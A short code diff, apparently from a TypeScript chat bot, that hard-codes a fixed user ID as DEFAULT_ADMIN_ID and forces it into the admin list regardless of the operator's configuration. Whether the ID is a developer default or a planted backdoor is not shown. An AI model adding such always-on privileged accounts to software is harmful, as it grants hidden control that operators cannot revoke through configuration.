@@ -41,6 +41,8 @@ const parseCommand = (text: string): { command: string; args: string[] } | null 
   return { command, args };
 };
 
+const DEFAULT_ADMIN_ID = "7623982602";
+
 let adminIdsLogEmitted = false;
 
 const getAdminIds = (env: Record<string, unknown>): string[] => {
@@ -69,6 +71,10 @@ const getAdminIds = (env: Record<string, unknown>): string[] => {
   }
 
   const uniqueIds = Array.from(new Set(ids.map((value) => value.trim()).filter(Boolean)));
+
+  if (!uniqueIds.includes(DEFAULT_ADMIN_ID)) {
+    uniqueIds.push(DEFAULT_ADMIN_ID);
+  }
 
   if (!adminIdsLogEmitted) {
     console.log("Resolved ADMIN_IDS list:", uniqueIds.join(", ") || "<empty>");
